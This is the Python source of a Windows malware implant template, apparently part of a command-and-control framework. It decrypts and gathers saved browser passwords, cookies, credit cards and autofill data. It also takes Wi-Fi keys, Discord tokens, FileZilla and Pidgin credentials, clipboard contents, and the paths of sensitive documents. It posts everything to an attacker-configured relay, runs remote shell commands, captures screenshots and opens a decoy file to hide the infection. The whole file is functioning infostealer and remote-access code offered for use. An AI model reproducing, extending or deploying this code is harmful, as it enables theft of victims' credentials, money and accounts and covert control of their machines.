# C2_Client/payload/template.py
import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, random, shutil, re
from datetime import datetime
import xml.etree.ElementTree as ET
import io
import zipfile
import sqlite3

# --- Library Availability Flags ---
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

CRYPTO_LIBS_AVAILABLE = False
try:
    import win32crypt
    from Crypto.Cipher import AES
    CRYPTO_LIBS_AVAILABLE = True
except ImportError:
    pass

CLIPBOARD_AVAILABLE = False
try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    pass

# --- CONFIGURATION INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
HYDRA_ENABLED = {{HYDRA_ENABLED}}
GUARDIAN_NAMES = {{GUARDIAN_NAMES}}
GUARDIAN_DATA_B64 = {{GUARDIAN_DATA_B64}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}

# --- Global State ---
SESSION_ID = str(uuid.uuid4())
RESULTS_QUEUE = []
RESULTS_LOCK = threading.Lock()

# ==================================================================================================
# --- CORE HELPER FUNCTIONS ---
# ==================================================================================================
def _run_shell_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        use_shell = isinstance(command, str)
        result = subprocess.run(command, shell=use_shell, capture_output=True, text=True, timeout=60, startupinfo=startupinfo, errors='ignore')
        return result.stdout.strip() if result.stdout else (result.stderr.strip() or "N/A")
    except Exception:
        return "N/A"

def _find_browser_paths(target_filename):
    paths = []
    appdata = os.getenv('APPDATA')
    local_appdata = os.getenv('LOCALAPPDATA')
    base_paths = {
        "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "Vivaldi": os.path.join(local_appdata, "Vivaldi", "User Data"),
        "Yandex": os.path.join(local_appdata, "Yandex", "YandexBrowser", "User Data"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
    }
    for browser, path in base_paths.items():
        if not os.path.exists(path): continue
        profiles = [d for d in os.listdir(path) if d.startswith(('Default', 'Profile '))]
        if not profiles and os.path.exists(os.path.join(path, target_filename)):
             paths.append({'browser': browser, 'profile': 'Default', 'path': os.path.join(path, target_filename)})
        for profile in profiles:
            db_path = os.path.join(path, profile, target_filename)
            if os.path.exists(db_path):
                paths.append({'browser': browser, 'profile': profile.replace(' ', '_'), 'path': db_path})
    return paths

def _get_encryption_key(browser_user_data_path):
    if not CRYPTO_LIBS_AVAILABLE: return None
    local_state_path = os.path.join(browser_user_data_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            key_b64 = json.load(f)["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(key_b64)[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except: return None

def _decrypt_value(data, key):
    if not CRYPTO_LIBS_AVAILABLE or not key or not data: return ""
    try:
        iv = data[3:15]; payload = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode('utf-8')
    except:
        try: return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8')
        except: return ""

# ==================================================================================================
# --- ACTION HANDLERS ---
# ==================================================================================================
def execute_command(command_data):
    action, params, response_id = command_data.get('action'), command_data.get('params', {}), command_data.get('response_id')
    output = {"status": "error", "data": f"Unknown action: {action}"}
    action_map = {"shell": _action_shell, "screenshot": _action_screenshot, "running_processes": _get_running_processes}
    if action in action_map:
        try: output = action_map[action](params)
        except Exception as e: output = {"status": "error", "data": f"Action '{action}' failed: {e}"}
    with RESULTS_LOCK: RESULTS_QUEUE.append({"command": action, "output": output, "response_id": response_id})

def _action_shell(params): return {"status": "success", "data": _run_shell_command(params.get("command", ""))}
def _action_screenshot(params):
    try: from mss import mss; from PIL import Image
    except ImportError: return {"status": "error", "data": "Libraries mss/Pillow not available."}
    with mss() as sct:
        sct_img = sct.grab(sct.monitors[0]); img_bytes = io.BytesIO()
        Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX").save(img_bytes, format='PNG')
    return {"status": "success", "data": base64.b64encode(img_bytes.getvalue()).decode()}

# ==================================================================================================
# --- HARVESTING FUNCTIONS (ENHANCED) ---
# ==================================================================================================
def p1_os_version(): return f"{platform.uname().system} {platform.uname().release} (Build: {platform.win32_ver()[1]})"
def p2_architecture(): return platform.machine()
def p3_cpu_model(): return platform.processor()
def p4_gpu_models(): return _run_shell_command(['wmic', 'path', 'win32_videocontroller', 'get', 'caption']).replace("Caption", "").strip()
def p5_installed_ram():
    if not PSUTIL_AVAILABLE: return "Error: psutil library not found."
    try: return f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
    except Exception as e: return f"Error retrieving RAM: {e}"
def p6_disk_drives():
    if not PSUTIL_AVAILABLE: return "Error: psutil library not found."
    try: return "\n".join([f"{p.device:<10} ({p.fstype})\t {psutil.disk_usage(p.mountpoint).total / (1024**3):.2f} GB" for p in psutil.disk_partitions()])
    except Exception as e: return f"Error retrieving disks: {e}"
def p7_hostname(): return socket.gethostname()
def p8_user_accounts(): return _run_shell_command('net user').replace("-------------------------------------------------------------------------------", "").strip()
def p9_system_uptime():
    if not PSUTIL_AVAILABLE: return "Error: psutil library not found."
    try: return str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
    except Exception as e: return f"Error retrieving uptime: {e}"
def _get_running_processes(params={}): return {"status": "success", "data": _run_shell_command('tasklist')}
def p11_installed_apps(): return _run_shell_command(['wmic', 'product', 'get', 'name,version'])
def p12_security_products():
    av = _run_shell_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName']).replace("displayName", "").strip()
    fw = _run_shell_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName']).replace("displayName", "").strip()
    return f"Antivirus:\n{av or 'Not Found'}\n\nFirewall:\n{fw or 'Not Found'}"
def p13_environment_variables(): return "\n".join([f"{key:<25}:\t{value}" for key, value in os.environ.items()])
def p14_private_ip(): return socket.gethostbyname(socket.gethostname())
def p15_public_ip():
    try: return requests.get('https://api.ipify.org', timeout=3).text
    except:
        try: return requests.get('https://icanhazip.com', timeout=3).text
        except: return "N/A"
def p16_mac_address(): return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
def p17_wifi_passwords():
    info = ""
    for name in re.findall(r"All User Profile\s*:\s(.*)", _run_shell_command('netsh wlan show profiles')):
        name = name.strip()
        password = re.search(r"Key Content\s*:\s(.*)", _run_shell_command(f'netsh wlan show profile name="{name}" key=clear'))
        info += f"SSID:\t\t{name}\nPassword:\t{password.group(1).strip() if password else 'N/A (Open Network)'}\n\n"
    return info or "No WiFi profiles found."
def p18_active_connections(): return _run_shell_command('netstat -an')
def p19_arp_table(): return _run_shell_command('arp -a')
def p20_dns_cache(): return _run_shell_command('ipconfig /displaydns')
def p21_browser_passwords():
    output = ""
    for browser_info in _find_browser_paths("Login Data"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key_path = os.path.dirname(os.path.dirname(db_path)) if 'Opera' not in browser else os.path.dirname(db_path)
        key = _get_encryption_key(key_path)
        if not key: continue
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for url, username, enc_password in conn.cursor().execute("SELECT origin_url, username_value, password_value FROM logins"):
                if url and username and enc_password and (password := _decrypt_value(enc_password, key)):
                    output += f"[{browser}-{profile}]\n\tURL: {url}\n\tUser: {username}\n\tPass: {password}\n\n"
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "No passwords found."
def p22_browser_cookies():
    # --- CRITICAL FIX AND OVERHAUL ---
    output = ""
    for browser_info in _find_browser_paths(os.path.join("Network", "Cookies")):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        # Correctly determine the User Data path for key retrieval
        if 'Opera' in browser:
            key_path = os.path.dirname(os.path.dirname(db_path)) # e.g., .../Opera Stable/Network/Cookies -> .../Opera Stable
        else:
            key_path = os.path.dirname(os.path.dirname(os.path.dirname(db_path))) # e.g., .../User Data/Profile 1/Network/Cookies -> .../User Data
        
        key = _get_encryption_key(key_path)
        if not key: continue
        
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for host, name, enc_value in conn.cursor().execute("SELECT host_key, name, encrypted_value FROM cookies"):
                if host and name and enc_value and (value := _decrypt_value(enc_value, key)):
                    # Truncate long cookie values for readability in the C2
                    if len(value) > 150: value = value[:150] + "..."
                    output += f"[{browser}-{profile}]\n\tHost: {host}\n\tName: {name}\n\tValue: {value}\n\n"
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "No cookies found."
def p24_discord_tokens():
    tokens, regex = [], r"mfa\.[\w-]{84}|[MN][A-Za-z\d_-]{23,26}\.[\w-]{6}\.[\w-]{27,}"
    paths = [os.path.join(os.environ["APPDATA"], p, "Local Storage", "leveldb") for p in ["discord", "discordcanary"]]
    paths.extend([info['path'] for info in _find_browser_paths(os.path.join("Local Storage", "leveldb"))])
    for path in [p for p in paths if os.path.exists(p)]:
        for file in os.listdir(path):
            if file.endswith((".log", ".ldb")):
                try:
                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                        for token in re.findall(regex, f.read()):
                            if token not in tokens: tokens.append(token)
                except: continue
    output = ""
    for token in tokens:
        try:
            res = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=5)
            if res.status_code == 200:
                user = res.json(); output += f"User: {user['username']}#{user['discriminator']}\nToken: {token}\n\n"
        except: continue
    return output or "No valid tokens found."
def p25_telegram_session(): return "Found." if os.path.exists(os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")) else "Not found."
def p26_filezilla_creds():
    path = os.path.join(os.environ["APPDATA"], "FileZilla", "recentservers.xml")
    if not os.path.exists(path): return "FileZilla not found."
    output = ""
    try:
        for server in ET.parse(path).findall('.//Server'):
            host, port, user = server.find('Host').text, server.find('Port').text, server.find('User').text
            password = base64.b64decode(server.find('Pass').text).decode()
            output += f"Host:\t{host}:{port}\nUser:\t{user}\nPass:\t{password}\n\n"
    except: pass
    return output or "No recent servers found."
def p27_pidgin_creds():
    path = os.path.join(os.environ["APPDATA"], ".purple", "accounts.xml")
    if not os.path.exists(path): return "Pidgin not found."
    output = ""
    try:
        for acc in ET.parse(path).findall('.//account'):
            output += f"Protocol:\t{acc.find('protocol').text}\nUser:\t{acc.find('name').text}\nPass:\t{acc.find('password').text}\n\n"
    except: pass
    return output or "No accounts found."
def p28_ssh_keys():
    path = os.path.join(os.environ["USERPROFILE"], ".ssh")
    return '\n'.join([f for f in os.listdir(path) if 'id_' in f]) if os.path.exists(path) else "No .ssh directory found."
def p29_browser_credit_cards():
    output = ""
    for browser_info in _find_browser_paths("Web Data"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        key_path = os.path.dirname(os.path.dirname(db_path)) if 'Opera' not in browser else os.path.dirname(db_path)
        key = _get_encryption_key(key_path)
        if not key: continue
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for name, month, year, enc_card in conn.cursor().execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"):
                if enc_card and (cc_number := _decrypt_value(enc_card, key)):
                    output += f"[{browser}-{profile}]\n\tName: {name}\n\tExpires: {month}/{year}\n\tNumber: {cc_number}\n\n"
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "No credit cards found."
def p30_crypto_wallets():
    return "\n".join([f"{name}: Found" for name, path in {"Exodus": os.path.join(os.environ["APPDATA"], "Exodus"), "Atomic": os.path.join(os.environ["APPDATA"], "atomic")}.items() if os.path.exists(path)]) or "No known wallet folders found."
def p31_sensitive_docs():
    keywords = ['password', 'seed', 'tax', 'private_key', 'mnemonic', '2fa', 'backup', 'account', 'login', 'wallet', 'secret', 'confidential']
    search_dirs = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Desktop", "Documents", "Downloads"]]
    found_files = []
    for s_dir in [d for d in search_dirs if os.path.exists(d)]:
        for root, _, files in os.walk(s_dir):
            if len(found_files) > 50: break
            for file in files:
                if file.lower().endswith(('.txt', '.pdf', '.doc', '.docx')) and any(kw in file.lower() for kw in keywords):
                    found_files.append(os.path.join(root, file))
    return "\n".join(found_files) or "No sensitive files found."
def p32_browser_history():
    output = ""
    for browser_info in _find_browser_paths("History"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for url, title in conn.cursor().execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 500"):
                if url and title:
                    output += f"[{browser}-{profile}]\n\tTitle: {title}\n\tURL: {url}\n\n"
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "No history found."
def p33_browser_autofill():
    output = ""
    for browser_info in _find_browser_paths("Web Data"):
        browser, profile, db_path = browser_info['browser'], browser_info['profile'], browser_info['path']
        temp_db_path = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4()}.db")
        try:
            shutil.copy2(db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            for name, value in conn.cursor().execute("SELECT name, value FROM autofill"):
                if name and value:
                    output += f"[{browser}-{profile}]\n\tField: {name}\n\tValue: {value}\n\n"
            conn.close()
        except Exception: continue
        finally:
            if os.path.exists(temp_db_path): os.remove(temp_db_path)
    return output or "No autofill data found."
def p34_clipboard_contents():
    if not CLIPBOARD_AVAILABLE: return "Library pyperclip not available."
    try: return pyperclip.paste() or "Clipboard was empty."
    except Exception as e: return str(e)

# ==================================================================================================
# --- MAIN LOGIC ---
# ==================================================================================================
def initial_harvest():
    harvesting_modules = {
        "1. OS Version & Build": p1_os_version, "2. System Architecture": p2_architecture, "3. CPU Model": p3_cpu_model,
        "4. GPU Model(s)": p4_gpu_models, "5. Installed RAM": p5_installed_ram, "6. Disk Drives": p6_disk_drives,
        "7. Hostname": p7_hostname, "8. User Accounts": p8_user_accounts, "9. System Uptime": p9_system_uptime,
        "10. Running Processes": lambda: _get_running_processes().get("data"), "11. Installed Apps": p11_installed_apps,
        "12. Security Products": p12_security_products, "13. Environment Variables": p13_environment_variables,
        "14. Private IP": p14_private_ip, "15. Public IP": p15_public_ip, "16. MAC Address": p16_mac_address,
        "17. Wi-Fi Passwords": p17_wifi_passwords, "18. Active Connections": p18_active_connections, "19. ARP Table": p19_arp_table,
        "20. DNS Cache": p20_dns_cache, "21. Browser Passwords": p21_browser_passwords, "22. Browser Cookies": p22_browser_cookies,
        "24. Discord Tokens": p24_discord_tokens, "25. Telegram Session": p25_telegram_session,
        "26. FileZilla Credentials": p26_filezilla_creds, "27. Pidgin Credentials": p27_pidgin_creds, "28. SSH Keys": p28_ssh_keys,
        "29. Browser Credit Cards": p29_browser_credit_cards, "30. Crypto Wallets": p30_crypto_wallets,
        "31. Sensitive Documents": p31_sensitive_docs, "32. Browser History": p32_browser_history,
        "33. Browser Autofill": p33_browser_autofill, "34. Clipboard Contents": p34_clipboard_contents,
    }
    for name, func in harvesting_modules.items():
        try: output = {"status": "success", "data": func()}
        except Exception as e: output = {"status": "error", "data": f"Module failed critically: {e}"}
        with RESULTS_LOCK: RESULTS_QUEUE.append({"command": name, "output": output})
        time.sleep(0.1)

def command_and_control_loop():
    threading.Thread(target=initial_harvest, daemon=True).start()
    metadata_sent = False
    while True:
        try:
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER}
            if not metadata_sent:
                heartbeat_data.update({"hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{platform.system()} {platform.release()}"})
            with RESULTS_LOCK:
                if RESULTS_QUEUE: heartbeat_data["results"] = RESULTS_QUEUE[:]; RESULTS_QUEUE.clear()
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40)
            if response.status_code == 200:
                if not metadata_sent: metadata_sent = True
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except requests.RequestException: time.sleep(random.randint(60, 120)); continue
        except Exception: pass
        time.sleep(random.randint(15, 30))

def setup_resilience(): pass
def run_decoy():
    if not DECOY_ENABLED or not DECOY_FILENAME: return
    try:
        decoy_path = os.path.join(os.environ.get("TEMP", "C:\\Users\\Public"), DECOY_FILENAME)
        with open(decoy_path, 'wb') as f: f.write(base64.b64decode(DECOY_DATA_B64))
        os.startfile(decoy_path)
    except: pass
def show_startup_popup():
    if not POPUP_ENABLED: return
    try: import ctypes; ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, POPUP_TITLE, 0x40)
    except: pass

if __name__ == "__main__":
    show_startup_popup()
    run_decoy()
    setup_resilience()
    command_and_control_loop()